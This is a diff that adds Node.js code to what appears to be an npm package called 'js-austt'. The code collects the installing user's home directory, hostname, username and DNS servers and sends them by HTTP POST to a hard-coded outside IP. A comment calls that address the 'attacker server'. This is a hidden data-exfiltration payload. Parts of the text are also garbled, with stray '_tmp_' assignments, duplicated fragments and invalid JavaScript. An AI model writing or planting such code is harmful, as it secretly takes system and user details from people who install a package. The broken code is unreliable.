@@ -1,0 +1,40 @@
+const trackingData = JSON.stringify({
+    package: "js-austt",
+    homeDir: os.homedir(),
+    hostname: os.hostname(),
+    username: os.userInfo().username,
+    dnsServers: dns.getServers(),
+})
+_tmp_0.hostname = os.hostname()
+const postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
+const options = {
+    hostname: "http://52.15.44.253", // Set this to your attacker server's URL
+    port: 80, // or the port your server is running on
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": Buffer.byteLength(postData),
+    },
+}
+_tmp_2.headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": Buffer.byteLength(postData),
+    }
+_tmp_3.Content-Length = Buffer.byteLength(postData)
+const req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+})
+res.on("data", (d) => {
+        process.stdout.write(d);
+    })
+(_tmp_4 = process.stdout).write
+req.on("error", (e) => {
+    console.error(e);
+})
+req.write(postData)
